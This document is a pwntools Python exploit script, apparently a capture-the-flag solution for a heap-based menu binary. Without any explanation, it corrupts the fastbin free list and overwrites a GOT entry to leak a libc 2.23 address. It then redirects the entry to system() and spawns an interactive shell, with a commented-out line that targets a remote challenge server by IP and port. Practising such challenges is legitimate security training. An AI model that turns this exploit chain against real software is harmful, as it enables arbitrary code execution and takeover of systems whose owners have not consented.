from pwn import *
#context.log_level='debug'
def cmd(c):
	p.sendlineafter("> ",str(c))
def add(size,data="A"):
	cmd(1)
	p.sendlineafter("data:\n",data.ljust(size,'\x00'))
def show(idx):
	cmd(2)
	p.sendlineafter("dex: ",str(idx))
def edit(idx,c,size):
	cmd(3)
	p.sendlineafter("dex: ",str(idx))
	p.sendline(c.ljust(size,'\x00'))
def free(idx):
	cmd(4)
	p.sendlineafter("dex: ",str(idx))
p=process('./pwn')
#p=remote("39.106.224.151",40002)
add(0x67,'A')#0
add(0x67,"A")#1
add(0x67,'B')#2
add(0x17,'K')#3
free(0)
free(2)
free(1)
free(3)
add(0x67,p64(0x4040bd))
add(0x67,"B")
add(0x67,"C")
add(0x17,"A"*8+p64(0x000000000404018))
add(0x67,"AAA")
edit(0,"AAA"+p64(0x4040e0)*2+p64(0x6700000000)+p64(0x000000000404018),0x67)
show(0)
libc=ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7a914f0-0x7ffff7a0d000)
libc.address=base
#
add(0x17,"/bin/sh")
edit(0,p64(libc.symbols['system']),8)
log.warning(hex(base))
free(1)
#gdb.attach(p,'b *0x000000000401692')


p.interactive()#
